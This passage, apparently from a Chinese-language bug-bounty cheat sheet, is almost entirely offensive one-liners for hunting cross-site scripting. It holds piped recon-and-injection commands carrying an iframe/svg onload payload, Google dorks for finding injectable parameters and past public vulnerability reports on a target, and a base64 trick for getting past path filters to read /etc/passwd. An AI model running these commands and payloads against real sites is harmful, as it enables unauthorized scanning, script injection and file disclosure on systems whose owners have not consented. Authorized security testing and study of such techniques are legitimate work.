    | qsreplace '\"><iframe/srcDoc=\"><svg/onload=confirm(document.domain);>> | kxss | tee -a results.txt
  ```
- 先看公开披露的历史，再决定打哪：
  ```
  site:http://openbugbounty.org inurl:reports intext:"<target>.com"
  ```
  用途：复测「已修复」的 XSS、把未修补的开放重定向升级成 SSRF。
- 易注入的参数名 dork：
  ```
  inurl:q= | inurl:?s= | inurl:search= | inurl:query= | inurl:lang= | inurl:keyword= inurl:& site:example[.]com
  ```
  ```
  site:http://target.com inurl:&
  ```
  ```
  site:*.target.com ext:php
  echo http://sub.target.com | waybackurls | grep "\?" | uro | httpx -silent > parameters.txt
  nuclei -l parameters.txt -t fuzzing-templates
  ```
  ```
  subfinder -d target.com | httprobe -c 100 > target.txt
  cat target.txt | waybackurls | gf xss | kxxs
  ```
  作者靠这条拿到一个所有特殊字符都不过滤、参数名是 `callback=` 的点。
- `qsreplace '">' | freq` 只验证反射，速度最快，适合先铺量：
  ```
  echo http://testphp.vulnweb.com | waybackurls | gf xss | uro | qsreplace '">' | freq | egrep -v 'Not' | anew xss | notify
  ```
  ```
  bash AutoRecon-XSS.sh <Target-URL> <Url-Recon-Year> <"XSS-Payload-you-wanna-Test">
  ```
- 路径参数整体 base64，绕过关键字或路径校验：
  ```
  url/?f=etc/passwd        → 403
  url/?f=L2V0Yy9wYXNzd2Q=  → 200
  ```
  同一招在 SQLi、SSTI、XSS、LFI 上都通用。
